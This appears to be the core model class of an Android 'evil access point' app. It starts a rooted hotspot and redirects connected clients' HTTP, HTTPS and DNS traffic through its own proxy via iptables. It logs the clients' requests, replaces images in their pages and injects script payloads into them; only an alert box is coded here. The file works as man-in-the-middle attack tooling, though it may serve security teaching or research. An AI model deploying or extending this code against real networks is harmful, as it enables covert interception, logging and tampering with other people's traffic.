package com.nibiru.evil_ap;

import android.Manifest;
import android.app.Activity;
import android.content.Context;
import android.content.CursorLoader;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.net.Uri;
import android.provider.MediaStore;
import android.support.v4.app.ActivityCompat;
import android.support.v4.util.Pair;

import com.nibiru.evil_ap.log.Client;
import com.nibiru.evil_ap.log.LogEntry;
import com.nibiru.evil_ap.manager.Ap;
import com.nibiru.evil_ap.manager.Root;
import com.nibiru.evil_ap.manager.Routing;
import com.nibiru.evil_ap.proxy.ProxyService;

import java.util.ArrayList;
import java.util.HashSet;
import java.util.List;
import java.util.Set;

/**
 * Created by Nibiru on 2016-12-06.
 */

public class Model implements IMVP.ModelOps{
    /**************************************CLASS FIELDS********************************************/
    protected final String TAG = getClass().getSimpleName();
    // Presenter reference
    private IMVP.RequiredPresenterOps mPresenter;
    // Manager helpers
    private Root mRootMan;
    private Ap mApMan;
    private Routing mRouteMan;
    //Configuration and shared object
    private SharedPreferences mConfig;
    private SharedClass mSharedObj;
    private Set<String> mBannedMACs;
    //App context
    private Context ctx;
    // Storage Permissions
    private static final int REQUEST_EXTERNAL_STORAGE = 1;
    private static String[] PERMISSIONS_STORAGE = {
            Manifest.permission.READ_EXTERNAL_STORAGE,
            Manifest.permission.WRITE_EXTERNAL_STORAGE
    };
    /**************************************CLASS METHODS*******************************************/
    public Model(IMVP.RequiredPresenterOps mPresenter, Context ctx) {
        this.mPresenter = mPresenter;
        mRootMan = new Root();
        mApMan = new Ap();
        mRouteMan = new Routing();
        this.mConfig = ctx.getSharedPreferences("Config", 0);
        this.mBannedMACs = new HashSet<>(5);
        this.ctx = ctx;
        mSharedObj = new SharedClass(ctx.getResources().openRawResource(R.raw.pixel_skull), ctx,this);
    }
    public Model(IMVP.RequiredPresenterOps mPresenter, Context ctx, boolean flag) {
        this.mPresenter = mPresenter;
        mRootMan = new Root();
        mApMan = new Ap();
        mRouteMan = new Routing();
        this.mConfig = ctx.getSharedPreferences("Config", 0);
        this.ctx = ctx;
    }
    /**
     * Sent from {@link Presenter#onDestroy(boolean)}
     * Should stop/kill operations that could be running
     * and aren't needed anymore
     */
    @Override
    public void onDestroy() {
        // destroying actions
    }

    /**
     * Setter for SharedPreferences of an int variable
     * @param tag The tag to be stored in SharedPreferences
     * @param val The value to be stored in SharedPreferences
     */
    public void setSharedPrefsInt(String tag, int val){
        mConfig.edit().putInt(tag,val).apply();
    }
    /**
     * Setter for SharedPreferences of a boolean variable
     * @param tag The tag to be stored in SharedPreferences
     * @param val The value to be stored in SharedPreferences
     */
    public void setSharedPrefsBool(String tag, boolean val){
        mConfig.edit().putBoolean(tag,val).apply();
    }
    /**
     * Setter for SharedPreferences of a String variable
     * @param tag The tag to be stored in SharedPreferences
     * @param val The value to be stored in SharedPreferences
     */
    public void setSharedPrefsString(String tag, String val){
        mConfig.edit().putString(tag,val).apply();
    }

    /**
     * Getter for SharedPreferences for an int variable
     * @param tag The tag to get
     * @return The stored SharedPreferences value
     */
    public int getSharedPrefsInt(String tag){
        return mConfig.getInt(tag, -1);
    }
    /**
     * Getter for SharedPreferences for a boolean variable
     * @param tag The tag to get
     * @return The stored SharedPreferences value
     */
    public boolean getSharedPrefsBool(String tag){
        return mConfig.getBoolean(tag, false);
    }
    /**
     * Getter for SharedPreferences for a String variable
     * @param tag The tag to get
     * @return The stored SharedPreferences value
     */
    public String getSharedPrefsString(String tag){
        return mConfig.getString(tag,"");
    }
    /**
     * Runs the "ip -4 neigh" command, formats output to construct list of Clients
     * @return Returns an ArrayList of {@link Client}
     */
    public ArrayList<Client> getCurrentClients(){
        ArrayList<String> output = mRootMan.RunAsRootWithOutput("ip -4 neigh");
        ArrayList<Client> clients = new ArrayList<>(output.size());
        for (String line : output) {
            String[] split = line.split(" +");
            //IP idx = 0 , MAC idx = 4, flags idx = 5
            if (split.length == 6 && (split[5].equals("REACHABLE") || split[5].equals("STALE"))) {
                clients.add(new Client(split[0], split[4], isBanned(split[4])));
            }
        }
        return clients;
    }
    /**
     * Accesses database to retrieve requests made by client
     * @param c The {@link Client} database will be queried for
     * @return A list of {@link LogEntry} variables
     */
    public List<LogEntry> getClientLog(Client c){
        return mSharedObj.getClientLog(c);
    }
    /**
     * Getter for the object shared between proxy threads handling clients
     * @return {@link SharedClass}
     */
    public SharedClass getSharedObj(){
        return mSharedObj;
    }
    /**
     * Using "ip -4 neigh" command retrieves the client by his IP
     * @param ip String representing IP
     * @return The {@link Client} or null if not found
     */
    public Client getClientByIp(String ip){
        ArrayList<String> output = mRootMan.RunAsRootWithOutput("ip -4 neigh");
        for (String line : output) {
            String[] split = line.split(" +");
            //IP idx = 0 , MAC idx = 4, flags idx = 5
            if (split.length == 6 && (split[0].equals(ip) )) {

                return new Client(split[0], split[4], isBanned(split[4]));
            }
        }
        return null;
    }

    /**
     * Resets the SharedSetting used by application
     */
    public void resetSharedPrefs() {
        mConfig.edit().clear().apply();
    }

    @Override
    public void onClean() {
        onTrafficRedirect("HTTP", false);
        onTrafficRedirect("HTTPS", false);
        onTrafficRedirect("DNS", false);
        for (String mac: mBannedMACs) {
            mRouteMan.filterMAC(mRootMan, mac, false);
        }
        mBannedMACs.clear();
    }

    /**
     * Applies an iptables rule to redirect traffic to our application
     * @param traffic Possible values "HTTP", "HTTPS", "DNS", ports defined in {@link Routing}
     * @param on Boolean value indicating if we should add(true) or delete(false) iptable rules
     */
    public void onTrafficRedirect(String traffic, boolean on){
        switch (traffic){
            case "HTTP":
                mRouteMan.redirectHTTP(on, mRootMan);
                break;
            case "HTTPS":
                mRouteMan.redirectHTTPS(on, mRootMan);
                break;
            case "DNS":
                mRouteMan.redirectDNS(on, mRootMan);
                break;
        }
    }
    /**
     * Verifies storage permissions, if failed asks user for permissions. Converts uri to
     * path. Loads image bytes for replacement into SharedClass and puts path in SharedPreferences
     * @param uri Uri to the image
     * @param act Activity that will ask for storage permissions if we don't have them
     */
    public void onLoadReplaceImg(Uri uri, Activity act){
        verifyStoragePermissions(act);
        String path = getPath(uri);
        setSharedPrefsString(ConfigTags.imgPath.toString(), path);
        mSharedObj.loadImage(path);
    }
    /**
     * Adds proper payload (indicated with integer) into payload list. Sets payloads in SharedClass
     * @param payloads A list of integer string pairs indicating payloads and its options
     */
    public void onJsPayloadApply(List<Pair<Integer, String>> payloads) {
        ArrayList<String> listP = new ArrayList<>();
        for (Pair<Integer, String> pair: payloads) {
            //an alert message box payload
            if( pair.first == 1){
                String p = "<script type=\"text/javascript\">alert(\""+pair.second+"\");</script>";
                listP.add(p);
            }
        }
        mSharedObj.setPayloads(listP);
    }
    /**
     *
     * @param SSID The AP name, if empty default "AP_nomap" is used
     * @param pass The AP password , if empty default "pa$$word" is used
     * @param ctx Application context needed to turn hotspot on or off
     * @return Returns if AP was turned on(true) or turned off (false)
     */
    public boolean onApToggle(String SSID, String pass, Context ctx){
        if (!mApMan.isApOn(ctx)){
            if( SSID.equals("") || pass.equals("") ) {
                //error handling
                if ( !mApMan.turnOnAp("AP_nomap", "pa$$word", ctx) ){
                    mPresenter.onError("Hotspot error!\n" +
                            "perhaps app doesn't have necessary permissions?");
                }
            }
            else {
                mApMan.turnOnAp(SSID, pass, ctx);
            }
            ctx.startService(new Intent(ctx, ProxyService.class));
            return true;
        }
        else if (mApMan.isApOn(ctx)){
            mApMan.turnOffAp(ctx);
            ctx.stopService(new Intent(ctx, ProxyService.class));
            return false;
        }
        else{
            return false;
        }
    }
    /**
     * Adds or removes iptables rule to drop client traffic
     * @param c The client whos ban status is changing
     * @param ban True if client is to be banned, false if unbanned
     */
    public void onBan(Client c, boolean ban){
        if (ban){
            mBannedMACs.add(c.getMac());
            mRouteMan.filterMAC(mRootMan, c.getMac(), true);
        }
        else{
            mBannedMACs.remove(c.getMac());
            mRouteMan.filterMAC(mRootMan, c.getMac(), false);
        }
    }

    /**
     * Checks if MAC address is banned or not
     * @param mac The String argument representing MAC address
     * @return Boolean true if MAC is banned or false if not
     */
    private boolean isBanned(String mac) {
       return mBannedMACs.contains(mac);
    }
    /**
     * Checks the current state of hotspot
     * @param ctx Context needed to check hotspot state
     * @return Boolean indication if hotspot is on (true) or off (false)
     */
    public boolean isApOn(Context ctx){
        return mApMan.isApOn(ctx);
    }
    /**
     * Uses various methods to check whether device is rooted
     * @return Boolean indicating device is rooted (true) or not (false)
     */
    public boolean isDeviceRooted(){
        return mRootMan.isDeviceRooted();
    }

    private String getPath(Uri uri) {
        String[] projection = { MediaStore.Images.Media.DATA };
        CursorLoader loader = new CursorLoader(ctx, uri, projection, null, null, null);
        Cursor cursor = loader.loadInBackground();
        int column_index = cursor.getColumnIndexOrThrow(MediaStore.Images.Media.DATA);
        cursor.moveToFirst();
        return cursor.getString(column_index);
    }
    private void verifyStoragePermissions(Activity act) {
        // Check if we have permission
        int permission = ActivityCompat.checkSelfPermission(ctx, Manifest.permission
                .READ_EXTERNAL_STORAGE);
        if (permission != PackageManager.PERMISSION_GRANTED) {
            // We don't have permission so prompt the user
            ActivityCompat.requestPermissions(act, PERMISSIONS_STORAGE, REQUEST_EXTERNAL_STORAGE);
        }
    }
}
